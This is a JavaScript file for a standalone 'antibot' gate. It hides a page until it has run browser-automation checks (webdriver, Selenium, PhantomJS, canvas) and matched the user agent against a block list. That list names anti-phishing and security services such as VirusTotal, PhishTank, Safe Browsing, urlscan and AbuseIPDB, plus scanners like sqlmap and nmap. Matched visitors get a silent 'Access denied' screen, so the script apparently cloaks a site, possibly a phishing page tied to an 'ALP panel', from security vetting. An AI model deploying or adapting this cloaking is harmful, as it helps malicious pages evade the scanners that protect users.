/**
 * Standalone Antibot — self-contained client-side gate.
 *
 * This is the SAME antibot detection as the ALP panel's antibot system,
 * but runs entirely independently with no panel dependency.
 *
 * How it works:
 *   1. HTML ships with an inline <style id="__ab_hide">html{visibility:hidden !important}</style>
 *      in <head>. Page is invisible until this script runs.
 *   2. This script runs the same detection checks as the panel's antibot
 *      (webdriver, headless Chrome, canvas fp, missing Permissions API, etc.).
 *   3. On hard-block flags → replace body with denied screen.
 *   4. On soft pass → verify fingerprint locally (no round-trip), reveal page.
 *
 * Session cache: once verified, we set sessionStorage['_abv']=1 so subsequent
 * navigations within the same session skip the checks.
 */
(function () {
  'use strict';

  // Skip if already verified this session (fast path for internal navigation)
  try {
    if (sessionStorage.getItem('_abv') === '1') { reveal(); return; }
  } catch (_) { /* private mode — carry on */ }

  // ── Detection checks (exact mirror of panel's antibot.js) ─────────────────
  var flags = [];
  function check(name, fn) {
    try { flags.push([name, !!fn()]); } catch (_) { flags.push([name, false]); }
  }

  check('wd',   function () { return navigator.webdriver === true; });
  check('ph',   function () { return !!(window.callPhantom || window._phantom || window.__phantomas); });
  check('nm',   function () { return !!window.__nightmare; });
  check('sl',   function () { return !!(window.Selenium || window.selenium || window.fxdriver_loaded); });
  check('cdc',  function () {
    return Object.getOwnPropertyNames(window).some(function (k) { return k.indexOf('cdc_') === 0; });
  });
  check('dom',  function () {
    var d = document;
    if (d.documentElement.getAttribute('webdriver')) return true;
    if (d.__webdriver_script_fn || d.$wdc_) return true;
    var oddKey = Object.keys(d).find(function (k) { return /\$[a-z]{3,5}_/.test(k); });
    return !!(oddKey && d[oddKey]);
  });
  check('hcl',  function () {
    return navigator.plugins.length === 0 && typeof Notification === 'undefined' && !window.chrome;
  });
  check('lang', function () { return !navigator.languages || navigator.languages.length === 0; });
  check('perm', function () { return typeof navigator.permissions === 'undefined'; });
  check('cv',   function () {
    try {
      var cv = document.createElement('canvas');
      var x  = cv.getContext('2d');
      x.fillText('test', 10, 10);
      return cv.toDataURL().length < 50;
    } catch (_) { return true; }
  });

  // Definitive-bot hard block — don't even bother with soft checks
  var hardBlock = flags.some(function (r) {
    return (r[0] === 'wd' || r[0] === 'ph' || r[0] === 'nm' || r[0] === 'sl') && r[1] === true;
  });
  if (hardBlock) return deny('Automation detected');

  // ── Soft checks: count suspicious flags ───────────────────────────────────
  var suspiciousCount = 0;
  flags.forEach(function (r) {
    if (r[1] === true) suspiciousCount++;
  });

  // If more than 3 soft flags triggered, likely a bot
  if (suspiciousCount > 3) return deny('Suspicious activity detected');

  // ── Build fingerprint for local verification ──────────────────────────────
  var fp = {};
  try {
    var cv2 = document.createElement('canvas');
    var x2  = cv2.getContext('2d');
    x2.font = '14px sans-serif';
    x2.fillStyle = '#3c4';
    x2.fillText('¶©test', 5, 20);
    fp.cv = cv2.toDataURL().slice(-16);
  } catch (_) { /* skip */ }
  fp.ua = (navigator.userAgent || '').slice(0, 100);
  fp.lang = navigator.language || '';
  try { fp.tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (_) {}
  fp.sc = (screen.width || 0) + 'x' + (screen.height || 0);
  fp.cd = screen.colorDepth || 0;
  fp.tp = navigator.maxTouchPoints || 0;
  fp.ts = Date.now();

  // ── Bot UA check (same patterns as server-side antibot) ───────────────────
  var botPatterns = [
    /\bbot\b/i, /\bcrawler\b/i, /\bspider\b/i, /\bscraper\b/i,
    /curl\//i, /wget\//i, /python-requests/i, /python\//i,
    /java\//i, /go-http-client/i, /libwww-perl/i,
    /PhantomJS/i, /HeadlessChrome/i, /SlimerJS/i,
    /[Ss]elenium/i, /webdriver/i, /ChromeDriver/i, /[Pp]laywright/i,
    /Googlebot/i, /Bingbot/i, /DuckDuckBot/i,
    /facebookexternalhit/i, /Twitterbot/i, /LinkedInBot/i,
    /WhatsApp\//i, /Slackbot/i, /TelegramBot/i, /Discordbot/i,
    /AhrefsBot/i, /SemrushBot/i, /MJ12bot/i, /DotBot/i,
    /zgrab/i, /masscan/i, /nuclei/i, /[Ss]qlmap/i,
    /[Nn]ikto/i, /nmap/i, /dirbuster/i, /gobuster/i, /feroxbuster/i,
    /okhttp\//i, /node-fetch/i, /axios\//i, /^got\//i, /superagent/i,
    /^PostmanRuntime/i, /insomnia/i, /httpie/i,
    /[Cc]heck[-_ ]?[Mm]ark/i, /[Vv]irus[Tt]otal/i, /[Pp]hish[Tt]ank/i,
    /[Oo]pening[Ss]ite/i, /[Ss]afe[Bb]rowsing/i, /[Uu]rl[Ss]can/i,
    /[Aa]buse[Ii][Pp]DB/i
  ];

  var ua = fp.ua || '';
  if (!ua || ua.trim() === '') return deny('No user agent');
  var isBot = botPatterns.some(function (p) { return p.test(ua); });
  if (isBot) return deny('Bot UA detected');

  // ── All checks passed — mark as verified and reveal ───────────────────────
  try { sessionStorage.setItem('_abv', '1'); } catch (_) {}

  // Set a JS cookie as a secondary verification marker
  try {
    var d = new Date();
    d.setTime(d.getTime() + 86400000); // 24 hours
    document.cookie = '_abpok=1;expires=' + d.toUTCString() + ';path=/;SameSite=Lax';
  } catch (_) {}

  reveal();

  // ── Helpers ────────────────────────────────────────────────────────────────
  function reveal() {
    // Remove the hiding style
    var s = document.getElementById('__ab_hide');
    if (s && s.parentNode) s.parentNode.removeChild(s);
    // Belt-and-suspenders: also unset inline styles some templates might have
    document.documentElement.style.visibility = '';
    if (document.body) document.body.style.visibility = '';
  }

  function deny(reason) {
    // Clear anything and show a clean denied screen; keep it minimal to avoid
    // giving scrapers hooks to fingerprint the block page.
    var html =
      '<div style="position:fixed;inset:0;display:flex;align-items:center;justify-content:center;' +
      'font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;background:#f0f2f5;' +
      'padding:24px;text-align:center;">' +
      '<div style="max-width:420px;background:#fff;border-radius:12px;padding:44px 32px;' +
      'box-shadow:0 4px 24px rgba(0,0,0,.08);">' +
      '<div style="font-size:44px;margin-bottom:16px;">🔒</div>' +
      '<div style="font-size:18px;font-weight:600;color:#111827;margin-bottom:8px;">Access denied</div>' +
      '<div style="font-size:13px;color:#6b7280;line-height:1.6;">This request could not be verified.</div>' +
      '</div></div>';
    // Replace <html> content: strip head so any inline scripts don't re-run
    document.documentElement.innerHTML = '<head><meta charset="utf-8"><title>Access denied</title></head><body>' + html + '</body>';
    document.documentElement.style.visibility = '';
    // Silence: don't log reason to console — scrapers scrape console too
    void reason;
  }
})();
